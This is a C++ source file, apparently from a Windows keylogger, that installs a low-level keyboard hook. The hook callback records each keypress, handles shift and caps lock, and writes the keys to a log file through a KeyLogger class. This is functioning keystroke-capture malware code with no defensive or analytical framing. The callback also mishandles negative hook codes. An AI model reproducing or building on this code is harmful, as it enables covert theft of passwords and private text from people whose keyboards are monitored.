#include "hooks.h"
#include "logger.h"
#include "memory.h"

#include <fstream>
#include <algorithm>
#include <Windows.h>


void Hooks::Init() {
	// 13 = WH_KEYBOARD_LL
	original_hook_ = g_memory.SetHook(WH_KEYBOARD_LL, reinterpret_cast<void *>(KeyboardHook));
}

Hooks::~Hooks() {
	g_memory.Unhook(original_hook_);
	original_hook_ = nullptr;
}

bool Hooks::HandleUpper(bool shift, bool caps) {
	if (shift && caps)
		return false;

	return (shift || caps);
}

std::uintptr_t Hooks::KeyboardHook(std::int32_t code, std::uint32_t wparam, std::uintptr_t lparam) {
	if (code < 0)
		g_memory.CallNextHook(g_hooks.original_hook_, code, wparam, lparam);

	const auto key = reinterpret_cast<KBDLLHOOKSTRUCT *>(lparam);

	static bool shift { };
	const auto virtual_key = key->vkCode;
	const auto is_caps_locked = (GetKeyState(VK_CAPITAL) & 1) != 0;

	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {
		// left or right shift
		if (virtual_key == 0xA0u || virtual_key == 0xA1u) {
			shift = true;
			// return here so it doesn't write LEFT SHIFT/RIGHT SHIFT into the file
			return g_memory.CallNextHook(g_hooks.original_hook_, code, wparam, lparam);
		}

		g_log.WriteToFile(KeyLogger::keys_[ virtual_key ], g_hooks.HandleUpper(shift, is_caps_locked));
		if (virtual_key == VK_RETURN) g_log.WriteToFile("\n");
	}

	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {
		// left or right shift
		if (virtual_key == 0xA0u || virtual_key == 0xA1u)
			shift = false;
	}

	return g_memory.CallNextHook(g_hooks.original_hook_, code, wparam, lparam);
}


Hooks g_hooks { };
